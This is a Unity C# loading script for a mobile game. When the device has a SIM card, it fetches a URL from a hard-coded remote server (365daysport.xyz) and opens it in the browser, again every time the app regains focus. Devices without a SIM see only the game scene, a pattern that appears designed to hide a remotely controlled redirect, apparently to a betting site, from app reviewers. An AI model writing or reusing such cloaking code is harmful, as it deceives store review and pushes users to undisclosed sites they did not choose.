using System;
using System.Collections;
using System.Net;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class Loading : MonoBehaviour
{
    private string JsonUrl
    {
        get => "https://365daysport.xyz/api.php?token=66c467594ea5dee6edc697f0367e4244";
    }

    private int HomeInt
    {
        get => PlayerPrefs.GetInt("homeint", 0);
        set => PlayerPrefs.SetInt("homeint", value);
    }

    private string HomeString
    {
        get => PlayerPrefs.GetString("homestring", "home");
        set => PlayerPrefs.SetString("homestring", value);
    }

    private void Awake()
    {
        Spinner.Instant();
        if (!CheckForInternetConnection())
        {
            NoInet.Instant();
            return;
        }

        if (HomeInt > 0 || !Simcard.Sim_Enable)
        {
            HomeInt = 1;
            SceneManager.LoadScene(1);
            return;
        }

        if (HomeString.Length > 4)
        {
            Application.OpenURL(HomeString);
            return;
        }

        StartCoroutine(GetJsonData((responce) =>
        {
            var data = JsonBody.Data(responce.Substring(1, responce.Length - 2));
            Application.OpenURL(HomeString = data.url);
        }));

        Application.deepLinkActivated += (deep) =>
        {
            Debug.Log($"deeplink:{deep}");
            if (deep.Contains("game"))
            {
                HomeInt = 1;
                SceneManager.LoadScene(1);
                return;
            }
            else if (deep.Contains("home"))
            {
                Application.Quit();
                return;
            }
        };

        Debug.Log($"Application.absoluteURL:{Application.absoluteURL}");
        if (!string.IsNullOrEmpty(Application.absoluteURL))
        {
            if (Application.absoluteURL.Contains("game"))
            {
                HomeInt = 1;
                SceneManager.LoadScene(1);
                return;
            }
            else if (Application.absoluteURL.Contains("home"))
            {
                Application.Quit();
                return;
            }

            Application.OpenURL(HomeString);
        }
    }

    private void OnApplicationFocus(bool focus)
    {
        if (focus && string.IsNullOrEmpty(Application.absoluteURL))
        {
            Application.OpenURL(HomeString);
        }
    }

    private bool CheckForInternetConnection()
    {
        try
        {
            var client = new WebClient();
            using (client.OpenRead("http://unity3d.com"))
            {
                return true;
            }
        }
        catch
        {
            return false;
        }
    }

    private IEnumerator GetJsonData(Action<string> OnFinishChecking)
    {
        var request = UnityWebRequest.Get(JsonUrl);
        yield return request.SendWebRequest();

        var ansver = request.downloadHandler.text;
        OnFinishChecking?.Invoke(ansver);
    }

    [Serializable]
    private class JsonBody
    {
        public string description;
        public string button;
        public string url;
        public string img_logo;

        public static JsonBody Data(string responce)
        {
            return JsonUtility.FromJson<JsonBody>(responce);
        }
    }
}
